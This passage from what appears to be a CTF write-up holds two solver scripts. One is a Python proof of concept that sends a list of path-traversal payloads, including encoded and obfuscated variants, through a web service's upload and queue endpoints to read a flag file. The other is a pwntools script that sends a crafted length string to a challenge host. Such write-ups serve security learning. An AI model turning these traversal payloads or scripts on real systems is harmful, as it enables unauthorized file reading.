</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>prefix</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>recover</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=exploit>Exploit</h1><h2 id=exploit-200-1-queue-the-music>Exploit 200-1 Queue the Music</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># PoC for pointeroverflow exp200 queuer / path-traversal attempt</span>
</span></span><span class=line><span class=cl><span class=c1># 使用方法: python3 poc_explist.py https://exp200-1.pointeroverflowctf.com</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python3 poc_explist.py &lt;BASE_URL&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Example: python3 poc_explist.py https://exp200-1.pointeroverflowctf.com&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BASE</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 你可以在这里添加/删减尝试的 sid 变体</span>
</span></span><span class=line><span class=cl><span class=n>CANDIDATES</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;../../flag/flag.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;../../../flag/flag.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;../../../../flag/flag.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/tmp/uploads/../../flag/flag.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/tmp/uploads/../../../flag/flag.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;../..//flag/flag.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;..</span><span class=si>%2f</span><span class=s2>..</span><span class=si>%2f</span><span class=s2>flag</span><span class=si>%2f</span><span class=s2>flag.txt&#34;</span><span class=p>,</span>   <span class=c1># URL encoded</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;..</span><span class=se>\\</span><span class=s2>..</span><span class=se>\\</span><span class=s2>flag</span><span class=se>\\</span><span class=s2>flag.txt&#34;</span><span class=p>,</span>     <span class=c1># windows style (大多数 unix 服务会忽略)</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;../../flag&#34;</span><span class=p>,</span>                 <span class=c1># 若服务拼接后再加 /track.txt -&gt; /flag/track.txt</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;../../flag/&#34;</span><span class=p>,</span>                <span class=c1># 同上，带尾斜杠</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;....//....//flag/flag.txt&#34;</span><span class=p>,</span>  <span class=c1># 混淆型</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 一些 HTTP 头，模拟常见浏览器请求</span>
</span></span><span class=line><span class=cl><span class=n>HEADERS</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;PoC/1.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_session</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>BASE</span> <span class=o>+</span> <span class=s2>&#34;/session&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>HEADERS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>j</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>sid</span> <span class=o>=</span> <span class=n>j</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;sid&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] /session -&gt;&#34;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>sid</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] /session raw -&gt;&#34;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>[:</span><span class=mi>200</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] /session error:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_with_sid</span><span class=p>(</span><span class=n>sid_value</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;POC_CONTENT&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>BASE</span> <span class=o>+</span> <span class=s2>&#34;/upload&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 尝试多种提交方式：form-data 与 json</span>
</span></span><span class=line><span class=cl>    <span class=c1># 1) form</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;sid&#34;</span><span class=p>:</span> <span class=n>sid_value</span><span class=p>,</span> <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=n>content</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>HEADERS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [upload form] sid=</span><span class=si>{</span><span class=n>sid_value</span><span class=si>!r}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    [upload form] error&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 2) json</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;sid&#34;</span><span class=p>:</span> <span class=n>sid_value</span><span class=p>,</span> <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=n>content</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>HEADERS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [upload json] sid=</span><span class=si>{</span><span class=n>sid_value</span><span class=si>!r}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    [upload json] error&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>queue_with_sid</span><span class=p>(</span><span class=n>sid_value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>BASE</span> <span class=o>+</span> <span class=s2>&#34;/queue&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 先尝试 form</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;sid&#34;</span><span class=p>:</span> <span class=n>sid_value</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>HEADERS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [queue form] sid=</span><span class=si>{</span><span class=n>sid_value</span><span class=si>!r}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    [queue form] error&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 再尝试 json</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;sid&#34;</span><span class=p>:</span> <span class=n>sid_value</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>HEADERS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    [queue json] sid=</span><span class=si>{</span><span class=n>sid_value</span><span class=si>!r}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    [queue json] error&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_playlist</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>BASE</span> <span class=o>+</span> <span class=s2>&#34;/playlist&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>HEADERS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] GET /playlist -&gt;&#34;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] GET /playlist error:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>try_candidate</span><span class=p>(</span><span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] try candidate:&#34;</span><span class=p>,</span> <span class=n>candidate</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 上传恶意 sid</span>
</span></span><span class=line><span class=cl>    <span class=n>upload_with_sid</span><span class=p>(</span><span class=n>candidate</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;poc-track&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 给服务一点时间处理（必要时可调小）</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 触发 queue 行为</span>
</span></span><span class=line><span class=cl>    <span class=n>queue_with_sid</span><span class=p>(</span><span class=n>candidate</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 等待并读取 playlist</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pl</span> <span class=o>=</span> <span class=n>get_playlist</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>pl</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    [!] playlist empty or couldn&#39;t fetch&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span><span class=p>,</span> <span class=n>pl</span>
</span></span><span class=line><span class=cl>    <span class=c1># 简单检测 flag-like pattern</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;flag{&#34;</span> <span class=ow>in</span> <span class=n>pl</span> <span class=ow>or</span> <span class=s2>&#34;FLAG{&#34;</span> <span class=ow>in</span> <span class=n>pl</span> <span class=ow>or</span> <span class=s2>&#34;poctf{&#34;</span> <span class=ow>in</span> <span class=n>pl</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!!!] POSSIBLE FLAG FOUND in playlist for candidate:&#34;</span><span class=p>,</span> <span class=n>candidate</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span><span class=p>,</span> <span class=n>pl</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    [-] no flag pattern in playlist for candidate:&#34;</span><span class=p>,</span> <span class=n>candidate</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span><span class=p>,</span> <span class=n>pl</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Base URL:&#34;</span><span class=p>,</span> <span class=n>BASE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] First, get /session (optional)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sid</span> <span class=o>=</span> <span class=n>get_session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] got server session sid:&#34;</span><span class=p>,</span> <span class=n>sid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] no sid from /session or couldn&#39;t parse; continuing with custom candidates&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 首先尝试服务返回的 sid（如果有）</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ok</span><span class=p>,</span> <span class=n>pl</span> <span class=o>=</span> <span class=n>try_candidate</span><span class=p>(</span><span class=n>sid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ok</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 然后遍历我们预制的 candidate 列表</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>CANDIDATES</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ok</span><span class=p>,</span> <span class=n>pl</span> <span class=o>=</span> <span class=n>try_candidate</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ok</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n\n</span><span class=s2>[!!!] FOUND FLAG in playlist dump:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Try also manual fuzzing or add more traversal patterns to CANDIDATES.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] If nothing found, 服务可能不会直接把 sid 当做文件路径拼接，或者 /tmp/uploads 不可写由外部用户修改。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251105185117-zb83eln.png alt=image></p><h2 id=exploit-100-2-mason-meridian>Exploit 100-2 Mason, Meridian</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;exp100-2.pointeroverflowctf.com&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>14662</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;200:AAA&#34;</span><span class=p>)</span>            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>part</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>    
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>part</span><span class=p>:</span> <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>buf</span> <span class=o>+=</span> <span class=n>part</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>buf</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span><span class=o>=</span><span class=s2>&#34;replace&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
